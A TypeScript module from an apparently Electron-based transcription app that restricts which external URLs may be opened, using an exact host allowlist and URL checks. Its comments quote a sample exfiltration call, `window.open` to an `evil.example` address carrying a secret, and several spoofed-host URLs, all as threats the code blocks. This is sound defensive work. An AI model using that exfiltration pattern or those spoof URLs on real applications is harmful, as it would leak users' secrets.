/**
 * Which external URLs the main process will hand to `shell.openExternal`.
 *
 * `setWindowOpenHandler` and `will-navigate` (see configureWindowSecurity in
 * main.ts) are the only renderer-reachable way out of the app. The renderer's
 * own CSP pins `connect-src 'self'`, so it cannot talk to the network itself —
 * which made these two handlers the single egress channel a compromised or
 * confused renderer could use. Allowing any `https:` URL there meant
 * `window.open("https://evil.example/?d=" + secret)` exfiltrated data through
 * the user's default browser, defeating the CSP entirely.
 *
 * The fix is a host allowlist rather than a protocol allowlist. The hosts below
 * are every external destination the renderer can actually produce:
 *
 * - `github.com` — RELEASES_URL, the manual-download fallback offered when the
 *   updater reports the build cannot self-update
 *   (src/components/update/UpdateStatusWidget.tsx).
 * - everything else — `provider.modelInfo.sourceUrl` rendered as the "Learn
 *   more" link beside each ASR provider (src/components/asr-provider-manager.tsx).
 *   Those URLs come from the sidecar's STATIC provider inventory
 *   (rust-sidecar/src/asr/mod.rs `AsrProviderType::all()`); every one of the
 *   twelve providers hard-codes its host, so this list is closed. Local model
 *   providers all point at huggingface.co; the cloud providers point at their
 *   own API documentation.
 *
 * `mailto:` was allowed and is deliberately gone: nothing in the renderer,
 * the sidecar, or index.html ever constructs one, so it was reachable surface
 * with no caller.
 *
 * The same rule is why `console.deepgram.com` and `aistudio.google.com` are
 * NOT here, even though both appear in the Deepgram and Gemini setup copy
 * ("Requires DEEPGRAM_API_KEY from https://console.deepgram.com"). That copy is
 * a provider `description` and a runtime-diagnostics message, and both are
 * rendered as plain text -- the renderer's only `href` to an external host is
 * `provider.modelInfo.sourceUrl` (asr-provider-manager.tsx) and its only
 * `window.open` is RELEASES_URL (UpdateStatusWidget.tsx). Nothing constructs a
 * navigation to either host, so adding them would widen the single egress
 * channel a compromised renderer has, for no caller. If a key-setup link is
 * ever made clickable, add the host in the same change as the link.
 *
 * Matching is exact host equality, never a suffix test: `evil-github.com` and
 * `github.com.evil.example` must not pass, and no provider needs a subdomain
 * wildcard.
 */
export const ALLOWED_EXTERNAL_HOSTS: readonly string[] = [
  // Cohere Transcribe → rust-sidecar/src/asr/cohere.rs
  "docs.cohere.com",
  // ASR provider docs → rust-sidecar/src/asr/{groq,openai_cloud,elevenlabs_scribe}.rs
  "console.groq.com",
  "developers.openai.com",
  "elevenlabs.io",
  // Deepgram Nova → rust-sidecar/src/asr/deepgram.rs
  "developers.deepgram.com",
  // Mistral Voxtral → rust-sidecar/src/asr/mistral_voxtral.rs
  "console.mistral.ai",
  "docs.mistral.ai",
  // Gemini Transcribe → rust-sidecar/src/asr/gemini_transcribe.rs
  "ai.google.dev",
  // macOS Apple Speech / Windows SDK dictation provider docs
  "developer.apple.com",
  "learn.microsoft.com",
  // Release downloads when the updater cannot install
  "github.com",
  // Every local ASR model card and weight file
  "huggingface.co",
  // The product site. Nothing links to it from the renderer today; it is listed
  // so a first-party docs or support link does not have to widen this list in a
  // hurry, and because it is the same origin the app already trusts for updates.
  "plainsong.jonathanrreed.com",
];

const ALLOWED_EXTERNAL_HOST_SET = new Set(ALLOWED_EXTERNAL_HOSTS);

/**
 * Whether `rawUrl` may be opened in the user's browser.
 *
 * Fails closed on anything unparseable, on any scheme other than `https:`, and
 * on any host not named above. `url.hostname` is compared (not `url.host`) so a
 * port cannot be used to smuggle a different authority past the check, and the
 * URL parser has already lowercased and punycoded the hostname by this point,
 * so `GitHub.com` and `xn--` spoofs both resolve before comparison.
 */
export function isAllowedExternalUrl(rawUrl: string): boolean {
  let url: URL;
  try {
    url = new URL(rawUrl);
  } catch {
    return false;
  }

  if (url.protocol !== "https:") {
    return false;
  }

  // A URL carrying credentials is never something the renderer legitimately
  // produced, and `https://github.com@evil.example/` parses with hostname
  // `evil.example` anyway — reject it explicitly so the intent is on record.
  if (url.username || url.password) {
    return false;
  }

  return ALLOWED_EXTERNAL_HOST_SET.has(url.hostname);
}
